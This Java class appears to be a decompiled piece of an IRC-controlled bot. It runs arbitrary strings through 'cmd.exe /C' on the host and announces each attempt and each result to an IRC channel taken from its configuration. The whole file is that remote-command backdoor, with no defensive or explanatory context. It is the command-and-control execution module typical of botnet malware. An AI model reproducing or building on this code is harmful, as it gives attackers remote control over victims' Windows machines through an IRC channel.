package mn.num;

import java.io.IOException;
public class CommandExecute extends Thread {
    public String command;
    Runtime rt;
    public CommandExecute(String cmd) {
        rt = Runtime.getRuntime();
        command = cmd;
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Trying to execute command ")).append(command).toString());
    }


    public void run() {
        try {
            rt.exec((new StringBuilder("cmd.exe /C ")).append(command).toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Command executed: ")).append(command).toString());
    }
}